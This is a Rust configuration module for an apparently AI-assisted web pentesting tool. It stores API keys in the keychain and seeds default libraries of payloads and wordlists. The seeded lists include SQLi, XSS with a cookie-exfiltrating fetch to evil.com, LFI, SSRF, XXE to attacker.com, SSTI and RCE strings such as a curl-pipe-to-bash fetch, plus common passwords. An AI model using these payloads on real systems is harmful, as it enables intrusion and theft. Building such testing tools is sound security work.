// Persistent configuration — saves/loads settings and KB docs.
// API keys are stored in the OS keychain (never written to disk in plain text).
// Everything else goes to ~/.config/farstyle/config.json

use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use crate::knowledge::{KbDoc, DocKind};

const APP_NAME: &str = "farstyle";
const SERVICE_NAME: &str = "farstyle-ai";

// ── Keychain helpers ────────────────────────────────────────────────────────

pub fn save_api_key(provider: &str, key: &str) {
    let entry = keyring::Entry::new(SERVICE_NAME, provider);
    if let Ok(e) = entry {
        let _ = e.set_password(key);
    }
}

pub fn load_api_key(provider: &str) -> Option<String> {
    let entry = keyring::Entry::new(SERVICE_NAME, provider).ok()?;
    entry.get_password().ok().filter(|s| !s.is_empty())
}

#[allow(dead_code)] // completes the keychain API (save/load/delete)
pub fn delete_api_key(provider: &str) {
    if let Ok(e) = keyring::Entry::new(SERVICE_NAME, provider) {
        let _ = e.delete_password();
    }
}

// ── JSON config file ─────────────────────────────────────────────────────────

fn config_path() -> PathBuf {
    let base = dirs_next();
    base.join("config.json")
}

fn config_dir() -> PathBuf {
    dirs_next()
}

fn dirs_next() -> PathBuf {
    // ~/.config/farstyle/
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".into());
    PathBuf::from(home).join(".config").join(APP_NAME)
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SavedKbDoc {
    pub id: usize,
    pub title: String,
    pub kind: String,   // "Note" | "Competence" | "File"
    pub content: String,
    pub enabled: bool,
}

/// A saved workspace message for session persistence.
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SavedWsMessage {
    pub role: String,   // "user" | "agent" | "tool" | "info"
    pub content: String,
    pub artifact: Option<String>,
}

/// An editable payload category in the Payloads library (persisted).
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SavedPayloadCategory {
    pub name: String,
    pub items: Vec<String>,
}

/// A working hypothesis about the target (persisted across sessions).
#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SavedHypothesis {
    pub text: String,
    pub author: String,   // "AI" | "Me"
    pub status: String,   // "Open" | "Testing" | "Valid" | "Invalid"
    pub evidence: String, // notes / proof gathered while testing it
    pub ts: String,       // created-at timestamp
}

/// Seed catalogue for the payload library — used on first run / when the saved
/// list is empty. Mirrors the original built-in set so nothing is lost.
pub fn default_payload_categories() -> Vec<SavedPayloadCategory> {
    let raw: &[(&str, &[&str])] = &[
        ("SQLi", &[
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "admin'--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1; DROP TABLE users--", "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "'; EXEC xp_cmdshell('whoami')--",
        ]),
        ("XSS", &[
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "\"onmouseover=\"alert(1)",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "javascript:alert(document.cookie)",
            "<script>fetch('https://evil.com?c='+document.cookie)</script>",
            "'-alert(1)-'", "\";alert(1)//",
        ]),
        ("LFI", &[
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../windows/win.ini",
            "../../../../windows/system32/drivers/etc/hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
        ]),
        ("SSRF", &[
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://[::1]/",
            "http://0.0.0.0/",
            "file:///etc/passwd",
            "dict://localhost:11211/stat",
            "gopher://127.0.0.1:9200/_search",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]),
        ("XXE", &[
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\">]><root>&xxe;</root>",
            "<!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]>",
        ]),
        ("SSTI", &[
            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
            "{{config}}", "{{self.__dict__}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{request.environ['SECRET_KEY']}}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "*{7*7}",
        ]),
        ("RCE", &[
            "; id", "| id", "& id", "`id`", "$(id)",
            "; cat /etc/passwd", "| cat /etc/passwd",
            "; ls -la", "; whoami", "; uname -a",
            "; curl http://attacker.com/shell.sh|bash",
            "|| ping -c 1 attacker.com",
        ]),
        ("Bypass", &[
            "../", "..%2F", "%2e%2e%2f", "..%252F", "..%c0%af",
            "%00", "null", "undefined", "NaN", "0",
            "true", "false", "1 OR 1=1", "' OR ''='",
            "admin%00", "admin\\x00",
        ]),
        ("Auth", &[
            "admin", "administrator", "root", "test", "guest",
            "password", "123456", "admin123", "letmein", "qwerty",
            "Password1!", "P@ssw0rd", "hunter2", "changeme",
        ]),
    ];
    raw.iter().map(|(name, items)| SavedPayloadCategory {
        name: name.to_string(),
        items: items.iter().map(|s| s.to_string()).collect(),
    }).collect()
}

/// Seed catalogue for the wordlist bank — fuzzing/brute-force lists used by the
/// Intruder and by external tools (ffuf, gobuster). Reuses SavedPayloadCategory
/// (name + items) since a wordlist is just a named list of strings.
pub fn default_wordlist_categories() -> Vec<SavedPayloadCategory> {
    let raw: &[(&str, &[&str])] = &[
        ("Directories", &[
            "admin", "login", "dashboard", "api", "uploads", "images", "css", "js",
            "backup", "backups", "config", "include", "includes", "tmp", "temp",
            "test", "dev", "old", "new", "private", "public", "assets", "static",
            "vendor", "node_modules", "wp-admin", "wp-content", "phpmyadmin",
            "server-status", "cgi-bin", ".git", ".env", ".svn", "robots.txt",
        ]),
        ("Files", &[
            "index.php", "index.html", "config.php", "config.json", ".env",
            "wp-config.php", "web.config", ".htaccess", "robots.txt", "sitemap.xml",
            "package.json", "composer.json", "Dockerfile", "docker-compose.yml",
            "id_rsa", "backup.zip", "backup.sql", "db.sql", "dump.sql",
            "credentials.txt", "passwords.txt", "users.txt", "README.md",
            ".DS_Store", "phpinfo.php", "test.php", "info.php",
        ]),
        ("API Endpoints", &[
            "api", "api/v1", "api/v2", "v1", "v2", "graphql", "rest",
            "api/users", "api/user", "api/login", "api/auth", "api/token",
            "api/admin", "api/config", "api/health", "api/status", "api/docs",
            "swagger", "swagger.json", "openapi.json", "api-docs", ".well-known",
            "api/products", "api/orders", "api/search", "api/upload",
        ]),
        ("Subdomains", &[
            "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1",
            "ns2", "dev", "staging", "stage", "test", "api", "admin", "portal",
            "vpn", "m", "mobile", "blog", "shop", "store", "app", "apps",
            "cdn", "static", "assets", "img", "secure", "demo", "beta", "dashboard",
        ]),
        ("Usernames", &[
            "admin", "administrator", "root", "user", "test", "guest", "demo",
            "operator", "manager", "support", "info", "webmaster", "sysadmin",
            "oracle", "postgres", "mysql", "ftp", "www-data", "service", "dev",
        ]),
        ("Passwords", &[
            "password", "123456", "12345678", "admin", "admin123", "root",
            "toor", "letmein", "qwerty", "111111", "123456789", "password1",
            "Password1!", "P@ssw0rd", "changeme", "welcome", "monkey", "dragon",
            "master", "hunter2", "iloveyou", "abc123", "Passw0rd", "secret",
        ]),
        ("Parameters", &[
            "id", "page", "user", "username", "password", "search", "q", "query",
            "file", "path", "url", "redirect", "next", "return", "callback",
            "token", "key", "api_key", "session", "lang", "debug", "test",
            "admin", "action", "cmd", "exec", "type", "format", "view", "sort",
        ]),
    ];
    raw.iter().map(|(name, items)| SavedPayloadCategory {
        name: name.to_string(),
        items: items.iter().map(|s| s.to_string()).collect(),
    }).collect()
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct AppConfig {
    pub target: String,
    pub ai_provider: String,    // "ollama" | "openai" | "openrouter"
    pub ai_endpoint: String,
    pub ai_model: String,
    pub proxy_port: u16,
    pub kb_docs: Vec<SavedKbDoc>,
    pub kb_next_id: usize,
    #[serde(default)]
    pub active_engagement_id: Option<String>,
    #[serde(default)]
    pub ws_session: Vec<SavedWsMessage>,
    #[serde(default)]
    pub payloads: Vec<SavedPayloadCategory>,
    #[serde(default)]
    pub wordlists: Vec<SavedPayloadCategory>,
    #[serde(default)]
    pub hypotheses: Vec<SavedHypothesis>,
    #[serde(default)]
    pub stt_provider: String,   // "openai" | "local" | "openrouter"
    #[serde(default)]
    pub stt_model: String,
    #[serde(default)]
    pub stt_endpoint: String,
    #[serde(default)]
    pub tts_enabled: bool,
    #[serde(default)]
    pub tts_voice: String,
    #[serde(default)]
    pub ws_fast_enabled: bool,
    #[serde(default)]
    pub ws_fast_model: String,
}

impl AppConfig {
    pub fn load() -> Self {
        let path = config_path();
        if !path.exists() {
            return Self::default_config();
        }
        match std::fs::read_to_string(&path) {
            Ok(raw) => serde_json::from_str(&raw).unwrap_or_else(|_| Self::default_config()),
            Err(_) => Self::default_config(),
        }
    }

    pub fn save(&self) {
        let dir = config_dir();
        let _ = std::fs::create_dir_all(&dir);
        let path = config_path();
        if let Ok(json) = serde_json::to_string_pretty(self) {
            let _ = std::fs::write(path, json);
        }
    }

    fn default_config() -> Self {
        Self {
            target: "https://target-domain.com".into(),
            ai_provider: "ollama".into(),
            ai_endpoint: "http://localhost:11434".into(),
            ai_model: "llama3".into(),
            proxy_port: 8000,
            kb_docs: vec![
                SavedKbDoc {
                    id: 1,
                    title: "SQL Injection Basics".into(),
                    kind: "Competence".into(),
                    content: "SQLi payloads: ' OR '1'='1, ' OR 1=1--, '; DROP TABLE users;--\nAlways test login forms, search bars, URL params.".into(),
                    enabled: true,
                },
                SavedKbDoc {
                    id: 2,
                    title: "XSS Payloads".into(),
                    kind: "Competence".into(),
                    content: "Basic: <script>alert(1)</script>\nAttribute: \" onmouseover=alert(1)\nFilter bypass: <img src=x onerror=alert(1)>".into(),
                    enabled: true,
                },
            ],
            kb_next_id: 3,
            active_engagement_id: None,
            ws_session: vec![],
            payloads: default_payload_categories(),
            wordlists: default_wordlist_categories(),
            hypotheses: vec![],
            stt_provider: "openai".into(),
            stt_model: String::new(),
            stt_endpoint: String::new(),
            tts_enabled: false,
            tts_voice: crate::tts::DEFAULT_VOICE.to_string(),
            ws_fast_enabled: false,
            ws_fast_model: "qwen2.5:1.5b".into(),
        }
    }
}

// ── KbDoc conversions ─────────────────────────────────────────────────────────

pub fn kb_doc_to_saved(doc: &KbDoc) -> SavedKbDoc {
    SavedKbDoc {
        id: doc.id,
        title: doc.title.clone(),
        kind: doc.kind.label().to_string(),
        content: doc.content.clone(),
        enabled: doc.enabled,
    }
}

pub fn saved_to_kb_doc(s: &SavedKbDoc) -> KbDoc {
    let kind = match s.kind.as_str() {
        "File"       => DocKind::UploadedFile,
        "Competence" => DocKind::Competence,
        _            => DocKind::ManualNote,
    };
    KbDoc {
        id: s.id,
        title: s.title.clone(),
        kind,
        content: s.content.clone(),
        enabled: s.enabled,
        source_path: None,
    }
}
